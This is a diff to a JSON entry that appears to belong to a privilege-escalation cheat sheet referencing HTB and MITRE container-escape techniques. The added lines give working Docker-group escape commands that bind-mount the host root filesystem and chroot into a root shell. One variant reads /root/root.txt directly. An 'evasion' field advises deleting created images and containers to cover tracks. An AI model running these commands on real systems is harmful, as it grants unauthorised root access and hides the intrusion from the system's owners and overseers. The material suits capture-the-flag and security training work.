@@ -94,6 +94,27 @@
       "HTB M25",
       "MITRE T1610",
       "MITRE T1611"
-    ]
-  }
+    ],
+    "evasion": "Use a single container/mount escape that reads what you need and exits; remove images/containers you created (docker rmi / lxc delete); avoid leaving a privileged container running."
+  },
+  "variations": [
+    {
+      "label": "Mount host root + chroot",
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    },
+    {
+      "label": "Read a root file directly",
+      "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Confirm docker group membership",
+      "command": "id | grep docker"
+    },
+    {
+      "label": "Escape to root via a bind-mount",
+      "command": "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
+    }
+  ]
 }
